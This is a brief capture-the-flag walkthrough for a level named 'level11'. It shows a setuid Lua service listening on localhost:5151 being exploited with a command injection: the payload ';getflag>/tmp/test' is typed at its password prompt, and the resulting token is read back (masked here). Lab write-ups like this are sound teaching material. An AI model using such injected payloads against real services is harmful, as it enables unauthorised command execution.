# Level11
## Step by step
### 1. Access the `level11` Home Directory
  ```bash
  > ls
  -rwsr-sr-x  1 flag11  level11  668 Mar  5  2016 level11.lua
  ```
---
### 2. Understanding the `level11.lua` Program

The `level11.lua` file contains Lua code that listens on `localhost:5151`.
  ```bash
  > nc localhost 5151
  Password: ;getflag>/tmp/test
  > cat /tmp/test
  Check flag.Here is your token : XXX
  ```
